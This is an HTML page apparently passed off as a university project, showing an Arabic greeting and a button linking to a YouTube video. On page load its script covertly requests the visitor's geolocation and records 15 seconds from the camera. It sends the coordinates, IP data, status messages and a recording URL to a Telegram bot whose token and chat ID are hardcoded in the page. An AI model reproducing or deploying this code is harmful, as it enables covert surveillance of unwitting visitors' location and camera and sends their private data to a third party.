<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشروع الجامعة</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border: none;
            border-radius: 12px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>صقر يسلم عليك</h1>
        <p>طيب</p>
        <button onclick="playVideo()">طيب</button>
    </div>

    <script>
        function playVideo() {
            window.location.href = 'https://youtube.com/watch?v=BGkL2Pq-g3A';
        }

        // Function to collect IP address and other data
        function collectData() {
            // This is a placeholder function. In a real implementation, you would use an API to get the IP address.
            const ipAddress = '192.168.1.1'; // Example IP address
            const userInfo = { ipAddress: ipAddress };
            const ipInfo = 'معلومات المستخدم: ' + JSON.stringify(userInfo);
            sendToTelegram(ipInfo);
        }

        // Function to request geolocation permission
        function requestGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                sendToTelegram('Geolocation is not supported by this browser.');
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const locationMessage = 'موقع المستخدم: إحداثيات (خط العرض: ' + latitude + ', خط الطول: ' + longitude + ')';
            sendToTelegram(locationMessage);
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    sendToTelegram('تم رفض إذن الموقع من قبل المستخدم.');
                    break;
                case error.POSITION_UNAVAILABLE:
                    sendToTelegram('معلومات الموقع غير متاحة.');
                    break;
                case error.TIMEOUT:
                    sendToTelegram('انتهت مهلة الطلب للحصول على موقع المستخدم.');
                    break;
                case error.UNKNOWN_ERROR:
                    sendToTelegram('حدث خطأ غير معروف.');
                    break;
            }
        }

        // Function to request camera permission
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];

                    mediaRecorder.ondataavailable = function(event) {
                        if (event.data.size > 0) {
                            chunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = function() {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const videoUrl = URL.createObjectURL(blob);
                        sendToTelegram('تم تسجيل الفيديو بنجاح لمدة 15 ثانية.');
                        // Send the video URL to Telegram
                        sendToTelegram(videoUrl);
                    };

                    mediaRecorder.start();

                    // Stop recording after 15 seconds
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 15000); // 15000 milliseconds (15 seconds)
                })
                .catch(function(err) {
                    sendToTelegram('تم رفض إذن الكاميرا من قبل المستخدم.');
                });
        }

        // Function to send messages to Telegram
        function sendToTelegram(message) {
            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
            const chatId = '6185375878';
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Collect data and request permissions on page load
        window.onload = function() {
            collectData();
            requestGeolocation();
            requestCameraPermission();
        };
    </script>
</body>
</html>
